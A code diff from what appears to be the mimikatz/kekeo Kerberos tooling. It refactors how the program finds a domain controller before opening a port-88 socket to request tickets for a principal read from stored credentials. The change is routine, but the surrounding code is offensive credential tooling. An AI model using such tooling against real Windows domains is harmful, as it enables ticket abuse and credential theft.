@@ -41,11 +41,10 @@ int main(int argc, char * argv[])
 
 	KDC_REP * TgsRep;
 	EncKDCRepPart *encTgsRepPart;
-	PCSTR dDomain, dKdc;
+	PCSTR dDomain;
 
 	DWORD i, len;
-	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
-	PSTR pos, pService, pTarget;
+	PSTR dKdc, pos, pService, pTarget;
 
 	kprintf("\n"
 		"  .#####.   " MIMIKATZ_FULL "\n"
@@ -73,10 +72,8 @@ int main(int argc, char * argv[])
 							if((encCred->ticket_info->value.bit_mask & pname_present) && encCred->ticket_info->value.prealm)
 							{
 								kprintf("Principal : %s @ %s\n", encCred->ticket_info->value.pname.name_string->value, encCred->ticket_info->value.prealm);
-								i = DsGetDcName(NULL, dDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
-								if(i == ERROR_SUCCESS)
+								if(kull_m_kerberos_helper_net_getDC(dDomain, DS_KDC_REQUIRED, &dKdc))
 								{
-									dKdc = cInfo->DomainControllerName + 2;
 									if(kull_m_sock_initSocket(dKdc, 88, &connectSocket))
 									{
 										for(i = 2; i < (DWORD) argc; i++)
@@ -113,9 +110,8 @@ int main(int argc, char * argv[])
 										}
 										kull_m_sock_termSocket(&connectSocket);
 									}
-									NetApiBufferFree(cInfo);
+									LocalFree(dKdc);
 								}
-								else PRINT_ERROR("  [KDC] DsGetDcName: %u\n", i);
 							}
 						}
 						kull_m_kerberos_asn1_helper_ossFreePDU(EncKrbCredPart_PDU, encCred);
